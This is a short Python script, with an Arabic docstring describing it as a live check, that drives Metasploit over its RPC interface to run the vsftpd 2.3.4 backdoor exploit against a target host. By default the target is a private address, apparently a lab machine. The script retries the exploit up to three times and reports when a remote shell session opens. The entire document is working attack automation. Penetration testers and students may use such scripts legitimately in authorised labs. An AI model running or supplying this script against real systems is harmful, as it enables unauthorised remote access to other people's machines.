"""فحص حي لثغرة vsftpd 2.3.4 backdoor عبر MSF-RPC مباشرة."""
from pymetasploit3.msfrpc import MsfRpcClient
import time, os, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.187.144"
pw = os.environ.get("MSF_RPC_PASS", "")
if not pw:
    sys.exit("export MSF_RPC_PASS اولاً")

c = MsfRpcClient(pw, server="127.0.0.1", port=55552, ssl=False)
print("Connected OK")

mod = c.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
mod["RHOSTS"] = TARGET
mod["RPORT"] = 21

for attempt in range(1, 4):
    print(f"\nAttempt {attempt}/3")
    before = set(c.sessions.list.keys())
    r = mod.execute()
    print("Execute result:", r)
    found = None
    for i in range(15):
        time.sleep(3)
        sess = set(c.sessions.list.keys()) - before
        if sess:
            found = sess
            break
        print(f"  waiting... {i*3}s")
    if found:
        print("SESSION OPENED:", found)
        print(c.sessions.list)
        break
    print("  no session this attempt")
else:
    print("\nNO SESSION after 3 attempts")
